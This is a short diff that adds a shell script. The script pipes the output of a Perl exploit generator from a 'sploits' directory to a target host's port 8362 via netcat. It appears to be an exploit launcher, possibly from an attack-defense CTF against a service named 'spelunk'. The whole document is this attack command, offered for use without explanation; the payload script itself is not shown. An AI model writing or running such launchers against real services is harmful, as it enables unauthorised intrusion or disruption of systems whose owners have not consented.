@@ -1,0 +1,3 @@
+#!/bin/sh
+
+./sploits/gen_noise_spelunk.pl|nc -w 1 $1 8362
